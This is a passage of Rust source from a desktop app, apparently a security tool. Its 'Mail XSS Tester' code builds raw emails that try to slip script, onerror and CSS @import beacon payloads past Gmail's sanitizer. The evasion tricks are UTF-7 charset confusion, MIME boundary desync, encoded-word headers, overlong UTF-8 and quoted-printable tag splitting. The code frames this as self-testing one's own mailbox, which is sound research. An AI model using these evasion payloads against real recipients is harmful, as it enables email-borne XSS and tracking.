            if ws_write.send(Message::Binary(buf[..n].to_vec())).await.is_err() {
                break;
            }
        }
    };

    tokio::select! {
        _ = ws_to_tcp => {},
        _ = tcp_to_ws => {},
    }
}

// Started once at app startup (see main()'s .setup()). A bind failure (e.g.
// a second instance of the app already holds the port) just means preview
// won't work this run - not worth failing the whole app over.
fn spawn_vnc_bridge() {
    tauri::async_runtime::spawn(async move {
        let listener = match TcpListener::bind(("127.0.0.1", VNC_BRIDGE_PORT)).await {
            Ok(l) => l,
            Err(_) => return,
        };
        loop {
            let stream = match listener.accept().await {
                Ok((stream, _)) => stream,
                Err(_) => continue,
            };
            tauri::async_runtime::spawn(handle_vnc_bridge_connection(stream));
        }
    });
}

// ─── Mail XSS Tester ─────────────────────────────────────────────────────────
// Self-test which HTML/XSS payloads survive a webmail's sanitization: send
// yourself an email containing several payload variants, each proving
// execution by calling out to a unique beacon URL - a stripped/sanitized
// payload never runs, so it never calls out. Every payload's ONLY effect is
// firing that beacon request (no exfiltration, no persistence) - this is a
// sanitization diagnostic for your OWN mailbox, not an attack tool.
//
// Detection needs a PUBLICLY reachable beacon endpoint: webmail providers
// (Gmail in particular) fetch/proxy embedded images through their own
// infrastructure, not from the recipient's machine, so a plain localhost
// listener can never receive the hit. `method` is a string ("cloudflare" for
// now) rather than a hardcoded single path, so a second, dependency-free
// method (e.g. UPnP router port-mapping) can be added later without renaming
// these commands.

#[derive(Serialize, Clone)]
struct BeaconHit {
    payload_id: String,
    timestamp_ms: u64,
    user_agent: String,
    remote_addr: String,
    // remote_addr above is the TCP peer of whoever connects to THIS process's
    // local listener - since the tunnel (startTunnel()) is a Cloudflare Quick
    // Tunnel pointed at http://127.0.0.1:<port>, that's always the local
    // cloudflared process itself (127.0.0.1), never the real visitor,
    // regardless of whether the mail provider proxies the fetch server-side
    // or the recipient's own browser makes it directly - the very question
    // this field exists to help answer. Cloudflare's edge adds
    // CF-Connecting-IP (falling back to the more generic X-Forwarded-For)
    // to every request it forwards, which IS the real originating IP one hop
    // before it reached Cloudflare - empty when neither header is present
    // (e.g. a future non-tunnel delivery method, where remote_addr itself
    // would already be meaningful).
    origin_ip: String,
}

struct MailXssTesterState {
    hits: Mutex<Vec<BeaconHit>>,
    beacon_task: Mutex<Option<tauri::async_runtime::JoinHandle<()>>>,
    tunnel_child: Mutex<Option<std::process::Child>>,
}

// 1x1 transparent GIF - a well-known, standard minimal tracking-pixel byte
// sequence, valid regardless of whether a payload embedded the beacon as an
// <img src>, a CSS @import, or a fetch()/Image() call.
const BEACON_GIF: [u8; 43] = [
    0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00,
    0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x21, 0xF9, 0x04, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02,
    0x44, 0x01, 0x00, 0x3B,
];

async fn handle_beacon_connection(mut stream: TcpStream, app: AppHandle, state: Arc<MailXssTesterState>) {
    let peer = stream.peer_addr().map(|a| a.to_string()).unwrap_or_default();

    let mut buf = vec![0u8; 8192];
    let mut total = 0usize;
    loop {
        if total >= buf.len() {
            break;
        }
        let n = match stream.read(&mut buf[total..]).await {
            Ok(0) => break,
            Ok(n) => n,
            Err(_) => return,
        };
        total += n;
        if buf[..total].windows(4).any(|w| w == b"\r\n\r\n") {
            break;
        }
    }

    let request = String::from_utf8_lossy(&buf[..total]).to_string();
    let mut lines = request.lines();
    let request_line = lines.next().unwrap_or("");
    let path = request_line.split_whitespace().nth(1).unwrap_or("");
    let payload_id = path.trim_start_matches('/').trim_start_matches("hit/").trim_end_matches('/').to_string();

    let mut user_agent = String::new();
    let mut cf_connecting_ip = String::new();
    let mut forwarded_for = String::new();
    for line in lines {
        if let Some(idx) = line.find(':') {
            let (name, value) = line.split_at(idx);
            let value = value[1..].trim().to_string();
            if name.eq_ignore_ascii_case("user-agent") {
                user_agent = value;
            } else if name.eq_ignore_ascii_case("cf-connecting-ip") {
                cf_connecting_ip = value;
            } else if name.eq_ignore_ascii_case("x-forwarded-for") {
                // Can be a comma-separated chain (client, proxy1, proxy2, ...) -
                // the first entry is the original client as seen by the first
                // proxy in the chain.
                forwarded_for = value.split(',').next().unwrap_or("").trim().to_string();
            }
        }
    }
    let origin_ip = if !cf_connecting_ip.is_empty() { cf_connecting_ip } else { forwarded_for };

    if !payload_id.is_empty() {
        let hit = BeaconHit {
            payload_id,
            timestamp_ms: SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_millis() as u64)
                .unwrap_or(0),
            user_agent,
            remote_addr: peer,
            origin_ip,
        };
        state.hits.lock().unwrap().push(hit.clone());
        let _ = app.emit("mail-xss-beacon-hit", &hit);
    }

    let header = format!(
        "HTTP/1.1 200 OK\r\nContent-Type: image/gif\r\nAccess-Control-Allow-Origin: *\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
        BEACON_GIF.len()
    );
    let _ = stream.write_all(header.as_bytes()).await;
    let _ = stream.write_all(&BEACON_GIF).await;
}

#[tauri::command]
async fn start_beacon_server(app: AppHandle) -> Result<u16, String> {
    let state = app.state::<Arc<MailXssTesterState>>().inner().clone();
    state.hits.lock().unwrap().clear();

    // Loopback-only - cloudflared (or, later, a UPnP-mapped router) is what
    // makes this reachable from the internet, this listener itself never
    // needs to accept connections from anywhere but the local machine.
    let listener = TcpListener::bind(("127.0.0.1", 0)).await.map_err(|e| e.to_string())?;
    let port = listener.local_addr().map_err(|e| e.to_string())?.port();

    let app2 = app.clone();
    let state2 = state.clone();
    let handle = tauri::async_runtime::spawn(async move {
        loop {
            let stream = match listener.accept().await {
                Ok((s, _)) => s,
                Err(_) => continue,
            };
            tauri::async_runtime::spawn(handle_beacon_connection(stream, app2.clone(), state2.clone()));
        }
    });
    *state.beacon_task.lock().unwrap() = Some(handle);

    Ok(port)
}

#[tauri::command]
fn stop_beacon_server(app: AppHandle) {
    let state = app.state::<Arc<MailXssTesterState>>().inner().clone();
    let handle = state.beacon_task.lock().unwrap().take();
    if let Some(handle) = handle {
        handle.abort();
    }
}

#[tauri::command]
fn get_beacon_hits(app: AppHandle) -> Vec<BeaconHit> {
    let state = app.state::<Arc<MailXssTesterState>>().inner().clone();
    let hits = state.hits.lock().unwrap().clone();
    hits
}

// method is a string (only "cloudflare" implemented today) rather than a
// hardcoded single code path, so a second, dependency-free method (UPnP
// router port-mapping) can be added later without renaming this command or
// touching the JS call sites' shape.
#[tauri::command]
async fn start_tunnel(app: AppHandle, method: String, local_port: u16) -> Result<String, String> {
    if method != "cloudflare" {
        return Err(format!("Unknown tunnel method: {}", method));
    }

    use std::io::{BufRead, BufReader};
    use std::process::Stdio;

    let mut child = Command::new("cloudflared")
        .args(["tunnel", "--url", &format!("http://127.0.0.1:{}", local_port)])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("cloudflared not found or failed to start: {}", e))?;

    // cloudflared prints its assigned public URL to stderr during startup -
    // there is no API for the free/anonymous Quick Tunnel feature (that's
    // precisely why it needs no account), so scraping the CLI's own output
    // for the generated https://*.trycloudflare.com URL is the standard,
    // documented way other tools integrate with it, not a workaround.
    let stderr = child.stderr.take().ok_or("cloudflared gave no stderr handle")?;

    // Stored in state RIGHT AWAY, not only after the URL shows up below -
    // this wait can take up to 20s (the timeout further down), and until
    // this line ran, cleanup_background_processes() had no way to find
    // this child at all if the app closed mid-wait, leaking exactly the
    // orphaned tunnel this whole mechanism exists to prevent. From here on
    // every path (success below, and all 3 error arms) reaches back into
    // state for the child instead of using the now-moved-out local.
    let state = app.state::<Arc<MailXssTesterState>>();
    *state.tunnel_child.lock().unwrap() = Some(child);

    let url_future = tokio::task::spawn_blocking(move || {
        let reader = BufReader::new(stderr);
        for line in reader.lines() {
            let line = match line {
                Ok(l) => l,
                Err(_) => continue,
            };
            if let Some(idx) = line.find("https://") {
                if line[idx..].contains("trycloudflare.com") {
                    let rest = &line[idx..];
                    let end = rest.find(char::is_whitespace).unwrap_or(rest.len());
                    return Some(rest[..end].to_string());
                }
            }
        }
        None
    });

    let url = match timeout(Duration::from_secs(20), url_future).await {
        Ok(Ok(Some(url))) => url,
        Ok(Ok(None)) => {
            if let Some(mut c) = state.tunnel_child.lock().unwrap().take() { let _ = c.kill(); }
            return Err("cloudflared exited without printing a tunnel URL".into());
        }
        Ok(Err(e)) => {
            if let Some(mut c) = state.tunnel_child.lock().unwrap().take() { let _ = c.kill(); }
            return Err(e.to_string());
        }
        Err(_) => {
            if let Some(mut c) = state.tunnel_child.lock().unwrap().take() { let _ = c.kill(); }
            return Err("Timed out waiting for cloudflared to report its tunnel URL".into());
        }
    };

    Ok(url)
}

#[tauri::command]
fn stop_tunnel(app: AppHandle) {
    let state = app.state::<Arc<MailXssTesterState>>().inner().clone();
    let child = state.tunnel_child.lock().unwrap().take();
    if let Some(mut child) = child {
        let _ = child.kill();
    }
}

#[tauri::command]
async fn send_test_email(
    gmail_address: String,
    app_password: String,
    to: String,
    subject: String,
    html_body: String,
    smtp_host: Option<String>,
) -> Result<(), String> {
    let email = lettre::Message::builder()
        .from(gmail_address.parse().map_err(|e: lettre::address::AddressError| e.to_string())?)
        .to(to.parse().map_err(|e: lettre::address::AddressError| e.to_string())?)
        .subject(subject)
        .header(lettre::message::header::ContentType::TEXT_HTML)
        .body(html_body)
        .map_err(|e| e.to_string())?;

    let creds = lettre::transport::smtp::authentication::Credentials::new(gmail_address, app_password);

    let host = smtp_host.as_deref().unwrap_or("smtp.gmail.com");
    let mailer = lettre::AsyncSmtpTransport::<lettre::Tokio1Executor>::relay(host)
        .map_err(|e| e.to_string())?
        .credentials(creds)
        .build();

    mailer.send(email).await.map_err(|e| e.to_string())?;
    Ok(())
}

// ─── Mail XSS Tester: raw-MIME encoding techniques ──────────────────────────
// send_test_email above builds a normal, well-formed UTF-8 text/html message
// via lettre's typed Message builder - fine for the tag/attribute-based
// payloads in mail-xss-tester-runtime.js's PAYLOADS, but useless for testing
// parser-differential bugs at the SMTP/MIME <-> HTML boundary (a real
// pentester's tip after the first Mail XSS Tester finding: stop throwing
// known payloads at Gmail - it already scans for those - and look at how
// special characters survive the trip through charset/MIME/header decoding
// instead). Those techniques need byte-level control lettre's typed API
// doesn't expose (a non-UTF-8 charset declaration, a hand-picked MIME
// boundary string repeated inside the body, invalid UTF-8 bytes), so this
// this builds the ENTIRE raw RFC 5322 message ourselves and hands it to lettre's
// send_raw() - the one escape hatch that sends whatever bytes it's given
// with no reprocessing, using lettre only for the SMTP conversation itself.

// RFC 2152 UTF-7: characters in Set D (letters, digits, and
// '(),-./:? plus whitespace) are written directly; everything else is
// UTF-16BE-encoded and wrapped in a base64 "+...-" shift sequence. Only a
// general-enough encoder for our own fixed ASCII payload strings - not a
// full UTF-7 codec (no support for a literal '+' needing "+-", not needed
// here since none of our payloads contain one).
fn utf7_encode(input: &str) -> String {
    fn is_direct(c: char) -> bool {
        c.is_ascii_alphanumeric() || "'(),-./:? \t\r\n".contains(c)
    }

    let chars: Vec<char> = input.chars().collect();
    let mut out = String::new();
    let mut i = 0;
    while i < chars.len() {
        if is_direct(chars[i]) {
            out.push(chars[i]);
            i += 1;
            continue;
        }
        let mut run_bytes: Vec<u8> = Vec::new();
        while i < chars.len() && !is_direct(chars[i]) {
            let units: Vec<u16> = chars[i].encode_utf16(&mut [0u16; 2]).to_vec();
            for u in units {
                run_bytes.push((u >> 8) as u8);
                run_bytes.push((u & 0xFF) as u8);
            }
            i += 1;
        }
        let encoded = BASE64_STANDARD.encode(&run_bytes);
        out.push('+');
        out.push_str(encoded.trim_end_matches('='));
        out.push('-');
    }
    out
}

// RFC 5322 §3.6 requires a Date header (and strongly recommends
// Message-ID) on every message - lettre's own typed Message::builder()
// (used by send_test_email, the 6 plain HTML payloads) auto-inserts one if
// missing, but these raw-MIME technique messages bypass that builder
// entirely, so without this they'd go out with neither. A message an MTA
// or spam filter can flag as malformed for missing standard headers is a
// confound worth ruling out before trusting a "didn't trigger" result -
// this isn't hypothetical, it's a real gap this file had until now.
fn format_rfc5322_date(unix_secs: u64) -> String {
    let days_since_epoch = (unix_secs / 86400) as i64;
    let secs_of_day = unix_secs % 86400;
    let hour = secs_of_day / 3600;
    let minute = (secs_of_day % 3600) / 60;
    let second = secs_of_day % 60;

    // Howard Hinnant's civil_from_days (proleptic Gregorian, days since
    // 1970-01-01) - avoids pulling in a whole date/time crate for one
    // header. Valid for any date this application will ever actually see
    // (z stays non-negative for every year back to roughly -1970).
    let z = days_since_epoch + 719468;
    let era = z / 146097;
    let doe = (z - era * 146097) as u64;
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    let y = yoe as i64 + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = (doy - (153 * mp + 2) / 5 + 1) as u32;
    let m = if mp < 10 { mp + 3 } else { mp - 9 } as u32;
    let year = if m <= 2 { y + 1 } else { y };

    // 1970-01-01 (day 0) was a Thursday.
    let weekday_idx = (((days_since_epoch % 7) + 7 + 4) % 7) as usize;
    const WEEKDAYS: [&str; 7] = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
    const MONTHS: [&str; 12] = [
        "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec",
    ];

    format!(
        "{}, {:02} {} {} {:02}:{:02}:{:02} +0000",
        WEEKDAYS[weekday_idx], d, MONTHS[(m - 1) as usize], year, hour, minute, second
    )
}

fn technique_message_headers(from: &str, to: &str, subject: &str, beacon_url: &str) -> String {
    let now_secs = SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    // Derived from beacon_url (which already carries a per-session random
    // token + technique id from the JS side) rather than generating fresh
    // randomness here - it's already unique per send, nothing new needed.
    format!(
        "From: {from}\r\nTo: {to}\r\nSubject: {subject}\r\nDate: {date}\r\nMessage-ID: <{msgid}@ipscanner.local>\r\nMIME-Version: 1.0\r\n",
        from = from,
        to = to,
        subject = subject,
        date = format_rfc5322_date(now_secs),
        msgid = md5_hex(beacon_url)
    )
}

// Technique 1: charset confusion. Declares the WHOLE body as UTF-7 and
// writes the payload's '<'/'>'/'{'/'}' through utf7_encode() above (plain
// ASCII letters/digits/URL punctuation already survive as literal Set D
// characters) - the sanitizer would need to decode UTF-7 itself before
// scanning for '<script>', not just pattern-match raw bytes, to catch this.
fn build_utf7_charset_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
    let raw_html = format!("<script>fetch('{}').catch(function(){{}})</script>", beacon_url);
    let body = utf7_encode(&raw_html);
    let message = format!(
        "{headers}Content-Type: text/html; charset=UTF-7\r\nContent-Transfer-Encoding: 7bit\r\n\r\n{body}\r\n",
        headers = technique_message_headers(from, to, subject, beacon_url),
        body = body
    );
    message.into_bytes()
}

// Technique 2: MIME boundary desync. A correctly-delimited multipart/
// alternative message, but the HTML part's own content contains a SECOND
// line starting with "--{boundary}" plus extra trailing characters - not a
// valid boundary delimiter per RFC 2046 (trailing non-whitespace after the
// boundary token invalidates it), so a strict parser treats it as inert
// text. A parser that only prefix-matches "--{boundary}" instead of
// requiring an exact line, however, would treat everything after it as a
// brand new, never-sanitized part. Testing whether Gmail's own rendering
// path is that lenient while whatever scans the message for known bad
// content is strict (or vice versa).
fn build_mime_boundary_desync_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
    let boundary = "XSSTEST_7f3a9c2b";
    let message = format!(
        "{headers}Content-Type: multipart/alternative; boundary=\"{boundary}\"\r\n\r\n\
         --{boundary}\r\n\
         Content-Type: text/plain; charset=utf-8\r\n\r\n\
         Plain-text fallback.\r\n\
         --{boundary}\r\n\
         Content-Type: text/html; charset=utf-8\r\n\r\n\
         <p>Normal, already-sanitized content.</p>\r\n\
         --{boundary}EXTRA_NOT_A_REAL_BOUNDARY\r\n\
         Content-Type: text/html; charset=utf-8\r\n\r\n\
         <img src=\"{beacon_url}\" alt=\"\" />\r\n\
         --{boundary}--\r\n",
        headers = technique_message_headers(from, to, subject, beacon_url),
        boundary = boundary,
        beacon_url = beacon_url
    );
    message.into_bytes()
}

// Same structural trick as build_mime_boundary_desync_message above, but
// smuggling <style>@import> instead of <img>. Confirmed real against Gmail:
// the plain <img> variant DID trigger, but the hit's origin IP/User-Agent
// showed it went through Google's own GoogleImageProxy (ggpht.com) rather
// than the recipient's browser directly - Gmail proxies image loads
// server-side regardless of how the <img> reference got into the rendered
// message, which blunts the IP/UA-leak impact of the underlying parser bug.
// External CSS isn't necessarily covered by that same image-proxy layer, so
// this variant tests whether the identical MIME-level confusion, routed
// through a non-image tag, reaches the recipient's own browser instead.
fn build_mime_boundary_desync_css_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
    let boundary = "XSSTEST_7f3a9c2b";
    let message = format!(
        "{headers}Content-Type: multipart/alternative; boundary=\"{boundary}\"\r\n\r\n\
         --{boundary}\r\n\
         Content-Type: text/plain; charset=utf-8\r\n\r\n\
         Plain-text fallback.\r\n\
         --{boundary}\r\n\
         Content-Type: text/html; charset=utf-8\r\n\r\n\
         <p>Normal, already-sanitized content.</p>\r\n\
         --{boundary}EXTRA_NOT_A_REAL_BOUNDARY\r\n\
         Content-Type: text/html; charset=utf-8\r\n\r\n\
         <style>@import \"{beacon_url}\";</style>\r\n\
         --{boundary}--\r\n",
        headers = technique_message_headers(from, to, subject, beacon_url),
        boundary = boundary,
        beacon_url = beacon_url
    );
    message.into_bytes()
}

// Control test for the two boundary-desync variants above - IDENTICAL
// 3-part multipart/alternative structure, but with a properly-formed
// closing boundary line for the third part instead of the deliberately
// malformed "{boundary}EXTRA_NOT_A_REAL_BOUNDARY" one. If the beacon still
// fires with a fully valid, spec-compliant MIME structure, that proves the
// malformed boundary was never doing anything special - the real cause is
// just multipart/alternative's own "render the last part the client
// understands" rule (RFC 2046 §5.1.4), and the two desync variants above
// aren't a parser bug at all, just an ordinary multi-alternative message.
fn build_mime_alternative_control_message(from: &str, to: &str, subject: &str, beacon_url: &str, smuggled_html: &str) -> Vec<u8> {
    let boundary = "XSSTEST_CONTROL_9d4e1a";
    let message = format!(
        "{headers}Content-Type: multipart/alternative; boundary=\"{boundary}\"\r\n\r\n\
         --{boundary}\r\n\
         Content-Type: text/plain; charset=utf-8\r\n\r\n\
         Plain-text fallback.\r\n\
         --{boundary}\r\n\
         Content-Type: text/html; charset=utf-8\r\n\r\n\
         <p>Normal, already-sanitized content.</p>\r\n\
         --{boundary}\r\n\
         Content-Type: text/html; charset=utf-8\r\n\r\n\
         {smuggled_html}\r\n\
         --{boundary}--\r\n",
        headers = technique_message_headers(from, to, subject, beacon_url),
        boundary = boundary,
        smuggled_html = smuggled_html
    );
    message.into_bytes()
}

fn build_mime_alternative_control_img_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
    let html = format!("<img src=\"{}\" alt=\"\" />", beacon_url);
    build_mime_alternative_control_message(from, to, subject, beacon_url, &html)
}

fn build_mime_alternative_control_css_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
    let html = format!("<style>@import \"{}\";</style>", beacon_url);
    build_mime_alternative_control_message(from, to, subject, beacon_url, &html)
}

// Technique 3: RFC 2047 encoded-word abuse. The sender's display name is
// almost always shown somewhere in a mail client's UI (inbox list, message
// header) as plain decoded text - safe IF that decode step feeds a text
// node/escaped context. Encoding an HTML-metacharacter-bearing string as a
// base64 encoded-word tests whether Gmail's OWN decode-and-render path for
// that specific field is one of the rare unescaped ones, independent of
// the body's own (likely correctly sanitized) HTML sanitizer.
fn build_encoded_word_header_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
    let injected = format!("<img src=x onerror=\"fetch('{}')\">", beacon_url);
    let encoded_word = format!("=?UTF-8?B?{}?=", BASE64_STANDARD.encode(injected.as_bytes()));
    let now_secs = SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    // Doesn't go through technique_message_headers() - the special encoded-
    // word "From" line shape doesn't fit that helper's plain "From: {from}"
    // format, but it needs the same Date/Message-ID treatment.
    let message = format!(
        "From: {encoded_word} <{from}>\r\nTo: {to}\r\nSubject: {subject}\r\nDate: {date}\r\nMessage-ID: <{msgid}@ipscanner.local>\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n\r\n<p>Encoded-word header test - see the sender name.</p>\r\n",
        encoded_word = encoded_word,
        from = from,
        to = to,
        subject = subject,
        date = format_rfc5322_date(now_secs),
        msgid = md5_hex(beacon_url)
    );
    message.into_bytes()
}

// Technique 4: overlong UTF-8. '<' (U+003C) and '>' (U+003E) re-encoded as
// invalid, non-canonical 2-byte sequences instead of their normal 1-byte
// form - rejected outright by any strict, spec-compliant decoder (Rust's
// own String type included, hence building this directly as raw bytes
// rather than through a Rust &str), but historically some lenient decoders
// normalized these back to the real character anyway. A legacy technique -
// most modern engines (Gmail's web client included) are very unlikely to
// still have this bug, but cheap enough to rule out for completeness.
fn build_overlong_utf8_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
    let mut body: Vec<u8> = Vec::new();
    body.extend_from_slice(b"<p>Overlong UTF-8 test follows:</p>");
    body.extend_from_slice(&[0xC0, 0xBC]); // overlong '<'
    body.extend_from_slice(b"img src=\"");
    body.extend_from_slice(beacon_url.as_bytes());
    body.extend_from_slice(b"\" alt=\"\"");
    body.extend_from_slice(&[0xC0, 0xBE]); // overlong '>'
    body.extend_from_slice(b"\r\n");

    let mut message = technique_message_headers(from, to, subject, beacon_url).into_bytes();
    message.extend_from_slice(b"Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: 8bit\r\n\r\n");
    message.extend_from_slice(&body);
    message
}

// Techniques 5-6: Quoted-Printable (RFC 2045 §6.7) - the transfer encoding
// that carries non-ASCII text (Polish diacritics included) over historically
// 7-bit-only SMTP, by hex-escaping any byte outside safe printable ASCII as
// "=XX". A second pentester tip, after the MIME-boundary dead end: look at
// how Gmail's preview handles Polish characters and long-line wrapping -
// quoted-printable is EXACTLY that mechanism, and it has its own protocol-
// level trick worth the same parser-differential treatment as the MIME
// boundary did: a "soft line break" (a literal '=' as the LAST character of
// a physical line, immediately followed by CRLF) is REMOVED during
// decoding, rejoining whatever's on either side into one continuous
// stretch of text - so a keyword can be split across two wire-level lines
// and still reassemble into the original word after decoding, without ever
// appearing intact, on one line, in the raw bytes.
fn quoted_printable_encode(input: &str) -> String {
    let mut out = String::new();
    for &b in input.as_bytes() {
        // Space/tab are safe to leave literal mid-line in this minimal
        // encoder - the real RFC 2045 rule only forces encoding them when
        // they're the LAST character before a line break (to survive naive
        // trailing-whitespace trimming), which doesn't apply here since
        // these builders place their own line breaks explicitly.
        let is_safe = b == b' ' || b == b'\t' || (b >= 33 && b <= 126 && b != b'=');
        if is_safe {
            out.push(b as char);
        } else {
            out.push_str(&format!("={:02X}", b));
        }
    }
    out
}

// Splits the word "script" (both the opening and closing tag) with a soft
// line break exactly in the middle - "scri=\r\npt" decodes back to "script"
// even though that substring never appears unbroken anywhere in the wire
// bytes. Padded with the classic Polish pangram (genuinely quoted-printable
// -encoded, not just decoration) since that's the exact real-world case the
// tip named - a sender actually writing Polish text is what forces a mail
// system to genuinely exercise this encoding path at all, rather than us
// declaring it artificially.
fn build_qp_soft_break_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
    let pangram_encoded = quoted_printable_encode("Zażółć gęślą jaźń");
    let body = format!(
        "<p>{pangram_encoded}</p><p>Test:</p><scri=\r\npt>fetch('{beacon_url}').catch(function(){{}})</scri=\r\npt>",
        pangram_encoded = pangram_encoded,
        beacon_url = beacon_url
    );
    let message = format!(
        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
        headers = technique_message_headers(from, to, subject, beacon_url),
        body = body
    );
    message.into_bytes()
}

// Every QP evasion technique above (this one included) only ever targeted
// <script> - a pentester's own follow-up naming "prasowania HTML/CSS"
// (folding of HTML/CSS) specifically called out CSS too, and this app's
// one CONFIRMED real finding this session was a CSS @import sanitizer
// gap (css-import in PAYLOADS above) - never combined with any of the
// SMTP/MIME-encoding evasion mechanics tested against <script>. Same
// split-the-tag-name soft break as build_qp_soft_break_message, applied
// to <style>/</style> instead of <script>/</script>.
fn build_qp_soft_break_style_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
    let pangram_encoded = quoted_printable_encode("Zażółć gęślą jaźń");
    let body = format!(
        "<p>{pangram_encoded}</p><p>Test:</p><sty=\r\nle>@import \"{beacon_url}\";</sty=\r\nle>",
        pangram_encoded = pangram_encoded,
        beacon_url = beacon_url
    );
    let message = format!(
        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
        headers = technique_message_headers(from, to, subject, beacon_url),
        body = body
    );
    message.into_bytes()
}

// CSS companion to build_qp_hex_escaped_tags_message - hex-escapes both
// '<' and '>' around <style>/</style> instead of <script>/</script>, same
// reasoning (no literal "<style"/"</style" substring anywhere in the raw
// wire bytes).
fn build_qp_hex_escaped_style_tags_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
    let body = format!(
        "<p>Test:</p>=3Cstyle=3E@import \"{beacon_url}\";=3C/style=3E",
        beacon_url = beacon_url
    );
    let message = format!(
        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
        headers = technique_message_headers(from, to, subject, beacon_url),
        body = body
    );
    message.into_bytes()
}

// RFC 2045 §6.7 rule 5: an encoded line must not exceed 76 characters
// (not counting the trailing CRLF) - a real, standards-compliant QP
// encoder inserts its OWN soft line break (a trailing '=' + CRLF, removed
// on decode same as above) wherever that limit is hit, at whatever
// position that happens to fall, based purely on running column count.
// This is deliberately different from quoted_printable_encode() above:
// qp-soft-break/qp-hex-escaped-tags hand-place ONE break at a byte offset
// WE chose (proving the mechanic exists at all); this lets the wrap land
// wherever the real 76-column rule actually puts it, which is what an
// uncontrolled real-world sender (a webmail's own outbound encoder, or a
// relaying MTA that re-encodes on the way through) would produce - never
// splits a "=XX" escape triplet itself, only ever breaks between whole
// units, since each unit's full length is checked before being pushed.
fn quoted_printable_encode_folded(input: &str) -> String {
    let mut out = String::new();
    let mut line_len = 0usize;
    for &b in input.as_bytes() {
        let is_safe = b == b' ' || b == b'\t' || (b >= 33 && b <= 126 && b != b'=');
        let unit_len = if is_safe { 1 } else { 3 };
        // 75, not 76 - leaves room for the soft break's own '=' character
        // on the current line before the break is taken.
        if line_len + unit_len > 75 {
            out.push_str("=\r\n");
            line_len = 0;
        }
        if is_safe {
            out.push(b as char);
        } else {
            out.push_str(&format!("={:02X}", b));
        }
        line_len += unit_len;
    }
    out
}

// Ten hand-written Polish filler sentences of increasing length (a
// pentester's own suggested test shape, verbatim) - the point isn't any
// one exact length, it's that varying how much text precedes <script>
// across variants sweeps the phase of where the 76-column wrap boundary
// falls relative to that word, without us ever choosing the split point
// ourselves the way qp-soft-break does.
fn qp_natural_wrap_variant_text(variant: u32) -> &'static str {
    match variant {
        1 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj.",
        2 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu.",
        3 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi.",
        4 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś.",
        5 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś daleko.",
        6 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś bardzo daleko.",
        7 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś bardzo, bardzo daleko.",
        8 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś bardzo, bardzo, bardzo daleko.",
        9 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, kochany przyjacielu z pięknej i dalekiej Łodzi.",
        _ => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy i radosny dzisiaj, kochany przyjacielu z pięknej i bardzo dalekiej Łodzi.",
    }
}

fn build_qp_natural_wrap_message(from: &str, to: &str, subject: &str, beacon_url: &str, variant: u32) -> Vec<u8> {
    let filler = qp_natural_wrap_variant_text(variant);
    let raw_html = format!(
        "<p>{filler} <script>fetch('{beacon_url}').catch(function(){{}})</script></p>",
        filler = filler,
        beacon_url = beacon_url
    );
    let body = quoted_printable_encode_folded(&raw_html);
    let message = format!(
        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
        headers = technique_message_headers(from, to, subject, beacon_url),
        body = body
    );
    message.into_bytes()
}

// Companion technique: '<' and '>' are already safe/printable ASCII and a
// standards-compliant encoder would never bother escaping them - but a
// compliant DECODER must still turn "=3C"/"=3E" back into real '<'/'>'
